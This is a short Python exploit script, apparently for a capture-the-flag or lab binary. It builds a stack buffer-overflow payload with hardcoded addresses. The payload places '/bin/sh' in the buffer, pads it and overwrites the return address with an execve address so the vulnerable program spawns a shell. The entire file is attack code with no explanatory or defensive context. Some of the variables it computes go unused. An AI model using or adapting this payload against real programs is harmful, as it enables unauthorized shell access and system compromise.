#!/usr/bin/env python3

import sys
execve_address = 0x455050
#execve_address = 0x0000000000401e21
execve_to_bytes = execve_address.to_bytes(8, 'little')

exit_address = 0x40b230
exit_to_bytes = exit_address.to_bytes(8, 'little')

bin_sh_address = 0x4d696a
bin_to_bytes = bin_sh_address.to_bytes(8, 'little')

buffer_address = 0x7ffffff0a38e
buffer_to_bytes = buffer_address.to_bytes(8, 'little')

second_arg = b"\x00" * 8
third_arg = b"\x00" * 8
 
combined = b"/bin/sh\x00" + b"A"*2 + second_arg + third_arg + buffer_to_bytes + b"A"*8 + execve_to_bytes
sys.stdout.buffer.write(combined)